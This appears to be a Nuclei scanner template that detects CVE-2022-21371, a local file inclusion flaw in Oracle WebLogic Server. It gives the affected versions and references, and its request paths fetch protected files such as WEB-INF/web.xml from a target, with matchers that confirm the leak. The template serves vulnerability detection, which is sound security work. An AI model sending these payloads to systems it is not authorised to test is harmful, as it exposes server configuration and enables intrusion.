id: CVE-2022-21371

info:
  name: Oracle WebLogic Server LFI
  author: Paradessia and Narluin
  severity: high
  description: Oracle WebLogic Server 12.1.3.0.0 / 12.2.1.3.0 / 12.2.1.4.0 / 14.1.1.0.0 Local File Inclusion
  tags: cve,cve2022,lfi,weblogic,oracle
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-21371
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21371
    - https://gist.github.com/picar0jsu/f3e32939153e4ced263d3d0c79bd8786
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.50
    cve-id: CVE-2022-21371

requests:
  - method: GET
    path:
      - "{{BaseURL}}.//META-INF/MANIFEST.MF"
      - "{{BaseURL}}.//WEB-INF/web.xml"
      - "{{BaseURL}}.//WEB-INF/portlet.xml"
      - "{{BaseURL}}.//WEB-INF/weblogic.xml"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<web-app"
          - "</web-app>"
        part: body
        condition: and

      - type: status
        status:
          - 200
